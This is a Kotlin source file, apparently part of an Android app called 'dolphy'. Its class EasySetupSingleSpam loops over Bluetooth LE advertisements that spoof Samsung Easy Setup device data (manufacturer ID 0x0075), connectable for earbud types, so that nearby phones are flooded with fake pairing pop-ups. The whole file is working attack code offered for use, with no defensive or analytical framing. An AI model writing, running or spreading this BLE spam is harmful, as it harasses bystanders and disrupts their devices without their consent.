package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class EasySetupSingleSpam(private val device: EasySetupDevice) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()
            val data = AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray(device.toManufacturerData()))
                .build()
            val scanResponse = AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray("0000000000000000000000000000"))
                .build()

            val isBuds = device.deviceType == EasySetupDevice.Type.BUDS
            advertiser.advertise(
                data,
                if (isBuds) scanResponse else null,
                forceLegacy = true,
                connectable = isBuds
            )

            try {
                while (isSpamming) {
                    blinkRunnable?.run()
                    com.droid.dolphy.trackBlePackets(1)
                    try {
                        Thread.sleep(Helper.delay.coerceAtLeast(100).toLong())
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            } finally {
                advertiser.stopAdvertising()
            }
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}

